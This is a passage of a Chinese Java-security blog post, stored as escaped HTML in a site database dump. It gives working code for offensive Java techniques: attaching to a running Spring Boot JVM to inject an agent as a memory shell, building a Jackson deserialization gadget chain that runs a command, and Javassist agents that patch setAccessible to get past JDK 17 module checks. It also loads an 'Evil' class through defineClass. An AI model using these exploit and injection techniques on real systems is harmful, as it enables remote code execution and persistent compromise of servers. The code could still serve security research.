AgentInitializationException, AgentLoadException, AgentInitializationException, AttachNotSupportedException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException, AgentLoadException, AgentInitializationException &#123;</span><br><span class=\"line\">        <span class=\"comment\">//调用VirtualMachine.list()获取正在运行的JVM列表</span></span><br><span class=\"line\">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(VirtualMachineDescriptor vmd : list)&#123;</span><br><span class=\"line\">            System.out.println(vmd.displayName());</span><br><span class=\"line\">            <span class=\"comment\">//遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(vmd.displayName().contains(<span class=\"string\">&quot;JavaAgentSpringBootApplication&quot;</span>))&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">//连接指定JVM</span></span><br><span class=\"line\">                <span class=\"type\">VirtualMachine</span> <span class=\"variable\">virtualMachine</span> <span class=\"operator\">=</span> VirtualMachine.attach(vmd.id());</span><br><span class=\"line\">                <span class=\"comment\">//加载Agent</span></span><br><span class=\"line\">                virtualMachine.loadAgent(<span class=\"string\">&quot;/Users/taoyu/Music/code/java_code/Java-Agent-Memshell/AgentInjectionExample/target/AgentInjectionExample-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);</span><br><span class=\"line\">                <span class=\"comment\">//断开JVM连接</span></span><br><span class=\"line\">                virtualMachine.detach();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>注入成功。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183255665.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183255665.png\"  alt=\"image-20241120183255665\" lazyload></a></p>\n<h2 id=\"Jackson删除writeReplace方法\"><a href=\"#Jackson删除writeReplace方法\" class=\"headerlink\" title=\"Jackson删除writeReplace方法\"></a>Jackson删除writeReplace方法</h2><p>说到这个链子，我们都知道需要删除BaseJsonNode的writeReplace方法。但是我们其实可以在premain的时候就把这件事情给做了。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Object</span> <span class=\"variable\">template</span> <span class=\"operator\">=</span> Gadgets.createTemplatesImpl(<span class=\"string\">&quot;open -a Calculator&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">CtClass</span> <span class=\"variable\">ctClass</span> <span class=\"operator\">=</span> ClassPool.getDefault().get(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">CtMethod</span> <span class=\"variable\">writeReplace</span> <span class=\"operator\">=</span> ctClass.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">ctClass.removeMethod(writeReplace);</span><br><span class=\"line\">ctClass.toClass();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">POJONode</span> <span class=\"variable\">jsonNodes</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">POJONode</span>(template);</span><br><span class=\"line\"><span class=\"type\">BadAttributeValueExpException</span> <span class=\"variable\">badAttributeValueExpException</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BadAttributeValueExpException</span>(<span class=\"literal\">null</span>);</span><br><span class=\"line\">Reflections.setFieldValue(badAttributeValueExpException, <span class=\"string\">&quot;val&quot;</span>, jsonNodes);</span><br><span class=\"line\"></span><br><span class=\"line\">System.out.println(Tool.base64Encode(Tool.serialize(badAttributeValueExpException)));</span><br></pre></td></tr></table></figure>\n\n<p>transform</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JacksonClassFileTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer)&#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">target1</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">className2</span> <span class=\"operator\">=</span> className.replace(<span class=\"string\">&quot;/&quot;</span>, <span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className2.equals(target1)) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Find the Inject Class: &quot;</span>+target1);</span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">pool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">CtClass</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> pool.getCtClass(className2);</span><br><span class=\"line\">                <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;writeReplace&quot;</span>);</span><br><span class=\"line\">                c.removeMethod(ctMethod);</span><br><span class=\"line\">                <span class=\"type\">byte</span>[] bytes = c.toBytecode();</span><br><span class=\"line\">                c.detach();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>agent</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JacksonAgent</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">premain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> <span class=\"keyword\">throws</span> UnmodifiableClassException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        inst.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">JacksonClassFileTransformer</span>(),<span class=\"literal\">true</span>);</span><br><span class=\"line\">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"string\">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>.equals(loadedClass.getName()))&#123;</span><br><span class=\"line\">                <span class=\"comment\">//重新transform</span></span><br><span class=\"line\">                inst.retransformClasses(loadedClass);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>.mf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Manifest-Version: 1.0</span><br><span class=\"line\">Can-Redefine-Classes: true</span><br><span class=\"line\">Can-Retransform-Classes: true</span><br><span class=\"line\">Premain-Class: cn.org.unk.JacksonAgent</span><br></pre></td></tr></table></figure>\n\n<p>然后我们生成对应的jar包。</p>\n<p>然后我们需要让项目运行的时候加上这样一个参数.带上我们的premain agent。</p>\n<p><code>-javaagent:/Users/taoyu/Music/code/java_code/Java-useful-agent/Java17/target/Java17-premain.jar</code></p>\n<p>Run-&gt;edit configurations</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183210072.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241120183210072.png\"  alt=\"image-20241120183210072\" lazyload></a></p>\n<p>然后我们构造链子的好时候就可以将以下代码删除依旧不影响我们poc的构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CtClass ctClass = ClassPool.getDefault().get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);</span><br><span class=\"line\">CtMethod writeReplace = ctClass.getDeclaredMethod(&quot;writeReplace&quot;);</span><br><span class=\"line\">ctClass.removeMethod(writeReplace);</span><br><span class=\"line\">ctClass.toClass();</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"高版本jdk反射修改私有属性\"><a href=\"#高版本jdk反射修改私有属性\" class=\"headerlink\" title=\"高版本jdk反射修改私有属性\"></a>高版本jdk反射修改私有属性</h2><p>dk9出现了module机制：<a href=\"https://zhuanlan.zhihu.com/p/640217638\">https://zhuanlan.zhihu.com/p/640217638</a></p>\n<p>java.xml是module的名字，不一定要和包名一样。</p>\n<p>exports表示外部可以访问当前module的哪些package。</p>\n<p>exports…to 表示指定该package只能被哪些package访问。</p>\n<p>同一个module下的类可以互相访问。</p>\n<p>我们以这个链子为例。</p>\n<p>EventListenerList ReadObject -&gt; ToString</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">Person</span> <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Person</span>(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"><span class=\"type\">EventListenerList</span> <span class=\"variable\">list</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">EventListenerList</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">UndoManager</span> <span class=\"variable\">manager</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">UndoManager</span>();</span><br><span class=\"line\"><span class=\"type\">Vector</span> <span class=\"variable\">vector</span> <span class=\"operator\">=</span> (Vector) getFieldValue(manager, <span class=\"string\">&quot;edits&quot;</span>);</span><br><span class=\"line\">vector.add(p);</span><br><span class=\"line\">setFieldValue(list, <span class=\"string\">&quot;listenerList&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;InternalError.class, manager&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">byte</span>[] code = serialize(list);</span><br><span class=\"line\">unserialize(code);</span><br></pre></td></tr></table></figure>\n\n<p>Person</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> String <span class=\"title function_\">toString</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    System.out.println(<span class=\"string\">&quot;this is tostring&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我们正常情况下调用私有属性的时候。下面这个 flag值为true。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setAccessible</span><span class=\"params\">(<span class=\"type\">boolean</span> flag)</span> &#123;</span><br><span class=\"line\">    AccessibleObject.checkPermission();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (flag) checkCanSetAccessible(Reflection.getCallerClass());</span><br><span class=\"line\">    setAccessible0(flag);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会爆以下错误。但是我们如果设置一个premain，就可以修改这段代码。让flag恒为flase。这样我们就可以setAccessible来进行各种操作了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Exception in thread &quot;main&quot; java.lang.reflect.InaccessibleObjectException: Unable to make field protected java.util.Vector javax.swing.undo.CompoundEdit.edits accessible: module java.desktop does not &quot;opens javax.swing.undo&quot; to unnamed module @60d14f0f</span><br><span class=\"line\">\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:354)</span><br><span class=\"line\">\tat java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:297)</span><br><span class=\"line\">\tat java.base/java.lang.reflect.Field.checkCanSetAccessible(Field.java:178)</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyClassFileTransformer</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">ClassFileTransformer</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class=\"type\">byte</span>[] classfileBuffer)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">target4</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;java.lang.reflect.Field&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">className2</span> <span class=\"operator\">=</span> className.replace(<span class=\"string\">&quot;/&quot;</span>, <span class=\"string\">&quot;.&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (className2.equals(target4)) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Find the Inject Class: &quot;</span>+target4);</span><br><span class=\"line\">            <span class=\"type\">ClassPool</span> <span class=\"variable\">pool</span> <span class=\"operator\">=</span> ClassPool.getDefault();</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"type\">CtClass</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> pool.getCtClass(className2);</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;hhhh&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">CtMethod</span> <span class=\"variable\">ctMethod</span> <span class=\"operator\">=</span> c.getDeclaredMethod(<span class=\"string\">&quot;setAccessible&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                ctMethod.setBody(<span class=\"string\">&quot;&#123;        java.lang.reflect.AccessibleObject.checkPermission();\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        if (false) checkCanSetAccessible(Reflection.getCallerClass());\\n&quot;</span> +</span><br><span class=\"line\">                        <span class=\"string\">&quot;        setAccessible0($1);&#125;&quot;</span>);</span><br><span class=\"line\">                <span class=\"type\">byte</span>[] bytes = c.toBytecode();</span><br><span class=\"line\">                c.detach();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> bytes;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyAgent</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">premain</span><span class=\"params\">(String agentArgs, Instrumentation inst)</span> <span class=\"keyword\">throws</span> UnmodifiableClassException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        inst.addTransformer(<span class=\"keyword\">new</span> <span class=\"title class_\">MyClassFileTransformer</span>(),<span class=\"literal\">true</span>);</span><br><span class=\"line\">        Class[] allLoadedClasses = inst.getAllLoadedClasses();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (Class loadedClass : allLoadedClasses) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"string\">&quot;java.lang.reflect.Field&quot;</span>.equals(loadedClass.getName()))&#123;</span><br><span class=\"line\">                <span class=\"comment\">//重新transform</span></span><br><span class=\"line\">                inst.retransformClasses(loadedClass);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"高版本JDK反射类加载\"><a href=\"#高版本JDK反射类加载\" class=\"headerlink\" title=\"高版本JDK反射类加载\"></a>高版本JDK反射类加载</h2><p>由于高版本的module机制，</p>\n<p>无法反射调用 TemplatesImpl 的get方法，POJONode的toString -&gt; 到任意get 的这种方法也没有办法用。</p>\n<p>但是我们可以修改Method 的 setAccessible也修改一下我们就可以了。但是需要让服务端加载这个permain时不太现实的。</p>\n<p>但是我们可以通过agentmain进行修改，但是有那种功夫，我们还不如注入内存马。直接拿shell。</p>\n<p>把上面的那个agent 的 Filed改成Method就可以了。<br>这样的这个恶意类在jdk17的环境下依旧是可以被加载的。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class=\"string\">&quot;target/classes/Evil.class&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">Method</span> <span class=\"variable\">method</span> <span class=\"operator\">=</span> ClassLoader.class.getDeclaredMethod(<span class=\"string\">&quot;defineClass&quot;</span>, String.class, <span class=\"type\">byte</span>[].class, <span class=\"type\">int</span>.class, <span class=\"type\">int</span>.class);</span><br><span class=\"line\">method.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">((Class)method.invoke(ClassLoader.getSystemClassLoader(), <span class=\"string\">&quot;Evil&quot;</span>, bytes, <span class=\"number\">0</span>, bytes.length)).newInstance();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cm3qw7j710001gb9pg8gu4bn9","tag_id":"cm3qw7j7o0004gb9pfb2o16z6","_id":"cm3qw7j830007gb9p4uai6nyb"},{"post_id":"cm5js0ud50000ub9ph0r28b26","tag_id":"cm5js0udc0002ub9p6dyw3ito","_id":"cm5js0udo0006ub9p1vq82lip"},{"post_id":"cm5js0uda0001ub9p25ay3w6b","tag_id":"cm5js0udi0004ub9pdf8b3okh","_id":"cm5js0udq0009ub9p7cnz26xj"},{"post_id":"cm5js0uda0001ub9p25ay3w6b","tag_id":"cm5js0udc0002ub9p6dyw3ito","_id":"cm5js0udq000aub9p0llnfmun"},{"post_id":"cm5js0ude0003ub9p9yvibb0j","tag_id":"cm5js0udi0004ub9pdf8b3okh","_id":"cm5js0udr000dub9p6oxn9flp"},{"post_id":"cm5js0ude0003ub9p9yvibb0j","tag_id":"cm5js0udc0002ub9p6dyw3ito","_id":"cm5js0udr000eub9p6bkrfw42"},{"post_id":"cm5jsi9eh0000az9p5mce3mw0","tag_id":"cm5js0udq000cub9p57uv7e6c","_id":"cm5jsi9ej0001az9pds0b647g"},{"post_id":"cm5js0ud50000ub9ph0r28b26","tag_id":"cm5js0udq000cub9p57uv7e6c","_id":"cm5jt74mv0000xa9p256f7cdl"},{"post_id":"cm5jsi9eh0000az9p5mce3mw0","tag_id":"cm5js0udc0002ub9p6dyw3ito","_id":"cm5jt824g0001xa9p0p46dsdp"},{"post_id":"cm5js0ud50000ub9ph0r28b26","tag_id":"cm5js0udi0004ub9pdf8b3okh","_id":"cm5jtbbt20002xa9p9jm78jg3"}],"Tag":[{"name":"渗透","_id":"cm3qw7j7o0004gb9pfb2o16z6"},{"name":"java","_id":"cm3qw7j7z0006gb9p2kcl9eri"},{"name":"myblog","_id":"cm5js0udc0002ub9p6dyw3ito"},{"name":"代码审计","_id":"cm5js0udi0004ub9pdf8b3okh"},{"name":"java安全","_id":"cm5js0udq000cub9p57uv7e6c"}]}}